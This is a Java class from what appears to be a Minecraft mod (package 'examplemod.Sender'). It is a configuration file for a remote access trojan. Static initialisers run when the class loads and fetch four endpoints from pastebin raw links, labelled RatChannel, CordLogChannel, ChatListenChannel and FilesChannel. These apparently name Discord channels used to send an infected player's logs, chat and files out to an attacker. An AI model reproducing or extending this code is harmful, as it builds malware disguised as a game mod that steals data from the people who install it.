package com.example.examplemod.Sender;

import java.io.IOException;
import java.net.URL;
import java.util.Scanner;

public class Cfg {


    public static String RatChannel;
    static {
        try {
            RatChannel = new Scanner(new URL("https://pastebin.com/raw/fAjH3G53").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    public static String CordLogChannel;
    static {
        try {
            CordLogChannel = new Scanner(new URL("https://pastebin.com/raw/fxti4JPw").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public static String ChatListenChannel;
    static {
        try {
            ChatListenChannel = new Scanner(new URL("https://pastebin.com/raw/2dsbVeW2").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String FilesChannel;
    static {
        try {
            FilesChannel = new Scanner(new URL("https://pastebin.com/raw/P5xzXSFk").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
